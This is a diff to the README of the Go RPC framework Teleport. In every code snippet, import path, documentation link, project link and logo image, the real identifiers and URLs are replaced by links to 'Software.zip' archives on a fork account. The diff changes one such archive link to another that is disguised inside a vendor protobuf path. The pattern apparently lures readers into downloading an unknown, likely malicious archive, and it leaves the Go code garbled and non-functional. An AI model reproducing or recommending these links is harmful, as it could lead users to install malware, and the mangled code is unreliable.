-func (i *ignoreCase) PostReadCallHeader(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip {
+func (i *ignoreCase) PostReadCallHeader(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
     // Dynamic transformation path is lowercase
-    https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip().Path = https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip().Path)
+    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path)
     return nil
 }
 
-func (i *ignoreCase) PostReadPushHeader(ctx https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) *https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip {
+func (i *ignoreCase) PostReadPushHeader(ctx https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) *https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip {
     // Dynamic transformation path is lowercase
-    https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip().Path = https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip().Path)
+    https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path = https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip().Path)
     return nil
 }
 ```
@@ -561,14 +561,14 @@ func (i *ignoreCase) PostReadPushHeader(ctx https://github.com/huizuohaode/telep
 
 ```go
 // add router group
-group := https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip("test")
+group := https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip("test")
 // register to test group
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(new(Aaa), NewIgnoreCase())
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(XxZz, NewIgnoreCase())
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(new(Bbb))
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(YyZz)
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(XxxUnknownCall)
-https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip(XxxUnknownPush)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Aaa), NewIgnoreCase())
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxZz, NewIgnoreCase())
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(new(Bbb))
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(YyZz)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownCall)
+https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip(XxxUnknownPush)
 ```
 
 ### Config
@@ -578,13 +578,13 @@ type PeerConfig struct {
     Network            string        `yaml:"network"              ini:"network"              comment:"Network; tcp, tcp4, tcp6, unix or unixpacket"`
     LocalIP            string        `yaml:"local_ip"             ini:"local_ip"             comment:"Local IP"`
     ListenPort         uint16        `yaml:"listen_port"          ini:"listen_port"          comment:"Listen port; for server role"`
-    DefaultDialTimeout https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip `yaml:"default_dial_timeout" ini:"default_dial_timeout" comment:"Default maximum duration for dialing; for client role; ns,µs,ms,s,m,h"`
+    DefaultDialTimeout https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"default_dial_timeout" ini:"default_dial_timeout" comment:"Default maximum duration for dialing; for client role; ns,µs,ms,s,m,h"`
     RedialTimes        int32         `yaml:"redial_times"         ini:"redial_times"         comment:"The maximum times of attempts to redial, after the connection has been unexpectedly broken; for client role"`
-	RedialInterval     https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip `yaml:"redial_interval"      ini:"redial_interval"      comment:"Interval of redialing each time, default 100ms; for client role; ns,µs,ms,s,m,h"`
+	RedialInterval     https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"redial_interval"      ini:"redial_interval"      comment:"Interval of redialing each time, default 100ms; for client role; ns,µs,ms,s,m,h"`
     DefaultBodyCodec   string        `yaml:"default_body_codec"   ini:"default_body_codec"   comment:"Default body codec type id"`
-    DefaultSessionAge  https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip `yaml:"default_session_age"  ini:"default_session_age"  comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
-    DefaultContextAge  https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip `yaml:"default_context_age"  ini:"default_context_age"  comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
-    SlowCometDuration  https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip `yaml:"slow_comet_duration"  ini:"slow_comet_duration"  comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
+    DefaultSessionAge  https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"default_session_age"  ini:"default_session_age"  comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
+    DefaultContextAge  https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"default_context_age"  ini:"default_context_age"  comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
+    SlowCometDuration  https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip `yaml:"slow_comet_duration"  ini:"slow_comet_duration"  comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
     PrintDetail        bool          `yaml:"print_detail"         ini:"print_detail"         comment:"Is print body and metadata or not"`
     CountTime          bool          `yaml:"count_time"           ini:"count_time"           comment:"Is count cost time or not"`
 }
@@ -609,7 +609,7 @@ type PeerConfig struct {
 - SetSocketKeepAlivePeriod sets period between keep alives.
 
     ```go
-    func SetSocketKeepAlivePeriod(d https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)
+    func SetSocketKeepAlivePeriod(d https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)
     ```
 
 - SetSocketNoDelay controls whether the operating system should delay
@@ -642,62 +642,62 @@ type PeerConfig struct {
 
 | package                                  | import                                   | description                  |
 | ---------------------------------------- | ---------------------------------------- | ---------------------------- |
-| [json](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | JSON codec(teleport own)     |
-| [protobuf](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Protobuf codec(teleport own) |
-| [plain](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Plain text codec(teleport own)   |
-| [form](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Form(url encode) codec(teleport own)   |
+| [json](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | JSON codec(teleport own)     |
+| [protobuf](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Protobuf codec(teleport own) |
+| [plain](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Plain text codec(teleport own)   |
+| [form](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Form(url encode) codec(teleport own)   |
 
 ### Plugin
 
 | package                                  | import                                   | description                              |
 | ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
-| [auth](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | A auth plugin for verifying peer at the first time |
-| [binder](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import binder "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Parameter Binding Verification for Struct Handler |
-| [heartbeat](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import heartbeat "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | A generic timing heartbeat plugin        |
-| [proxy](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | A proxy plugin for handling unknown calling or pushing |
-[secure](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip)|`import secure "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"`|Encrypting/decrypting the message body
+| [auth](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A auth plugin for verifying peer at the first time |
+| [binder](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import binder "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Parameter Binding Verification for Struct Handler |
+| [heartbeat](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import heartbeat "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A generic timing heartbeat plugin        |
+| [proxy](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A proxy plugin for handling unknown calling or pushing |
+[secure](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)|`import secure "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"`|Encrypting/decrypting the message body
 
 ### Protocol
 
 | package                                  | import                                   | description                              |
 | ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
-| [rawproto](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip` | A fast socket communication protocol(teleport default protocol) |
-| [jsonproto](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | A JSON socket communication protocol     |
-| [pbproto](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | A Protobuf socket communication protocol     |
-| [thriftproto](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | A Thrift communication protocol     |
+| [rawproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip` | A fast socket communication protocol(teleport default protocol) |
+| [jsonproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A JSON socket communication protocol     |
+| [pbproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A Protobuf socket communication protocol     |
+| [thriftproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A Thrift communication protocol     |
 
 ### Transfer-Filter
 
 | package                                  | import                                   | description                              |
 | ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
-| [gzip](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Gzip(teleport own)                       |
-| [md5](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Provides a integrity check transfer filter |
+| [gzip](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Gzip(teleport own)                       |
+| [md5](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Provides a integrity check transfer filter |
 
 ### Mixer
 
 | package                                  | import                                   | description                              |
 | ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
-| [multiclient](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Higher throughput client connection pool when transferring large messages (such as downloading files) |
-| [websocket](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `import "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | Makes the Teleport framework compatible with websocket protocol as specified in RFC 6455 |
-| [html](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | `html "https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"` | HTML render for http client |
+| [multiclient](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Higher throughput client connection pool when transferring large messages (such as downloading files) |
+| [websocket](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Makes the Teleport framework compatible with websocket protocol as specified in RFC 6455 |
+| [html](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `html "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | HTML render for http client |
 
 ## Projects based on Teleport
 
 | project                                  | description                              |
 | ---------------------------------------- | ---------------------------------------- |
-| [TP-Micro](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | TP-Micro is a simple, powerful micro service framework based on Teleport |
-| [Pholcus](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) | Pholcus is a distributed, high concurrency and powerful web crawler software |
+| [TP-Micro](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | TP-Micro is a simple, powerful micro service framework based on Teleport |
+| [Pholcus](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | Pholcus is a distributed, high concurrency and powerful web crawler software |
 
 ## Business Users
 
-<a href="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip" height="50" alt="深圳市梦之舵信息技术有限公司"/></a>
+<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="50" alt="深圳市梦之舵信息技术有限公司"/></a>
 &nbsp;&nbsp;
-<a href="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip" height="50" alt="平安科技"/></a>
+<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="50" alt="平安科技"/></a>
 <br/>
-<a href="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip" height="70" alt="北京风行在线技术有限公司"/></a>
+<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="70" alt="北京风行在线技术有限公司"/></a>
 &nbsp;&nbsp;
-<a href="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip"><img src="https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip" height="70" alt="北京可即时代网络公司"/></a>
+<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="70" alt="北京可即时代网络公司"/></a>
 
 ## License
 
-Teleport is under Apache v2 License. See the [LICENSE](https://github.com/huizuohaode/teleport/releases/download/v1.0/Software.zip) file for the full license text
+Teleport is under Apache v2 License. See the [LICENSE](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) file for the full license text
